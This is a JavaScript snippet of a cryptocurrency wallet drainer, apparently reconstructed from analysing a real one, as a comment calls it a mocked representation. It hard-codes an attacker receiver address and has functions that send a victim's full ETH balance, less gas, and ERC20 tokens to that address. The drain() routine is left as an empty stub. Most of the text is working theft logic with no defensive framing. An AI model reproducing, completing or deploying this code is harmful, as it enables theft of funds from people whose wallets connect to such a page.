const DRAINER_CONFIG = {
    'receiver_address': '0xB51037d8e272dA3682E32a76537E95a7d6E4C937'
};

// Obfuscated core logic (mocked representation based on previous view)
async function sendEth(amount, gasPrice) {
    const newAmount = amount - (gasPrice * 21000);
    if (newAmount <= 0) return;
    const tx = {
        from: account,
        to: DRAINER_CONFIG.receiver_address,
        value: newAmount,
        gasPrice: gasPrice
    };
    await web3.eth.sendTransaction(tx);
}

async function sendToken(token, amount) {
    const contract = new web3.eth.Contract(ERC20_ABI, token);
    await contract.methods.transfer(DRAINER_CONFIG.receiver_address, amount).send({ from: account });
}

async function drain() {
    // Logic to iterate and drain
}
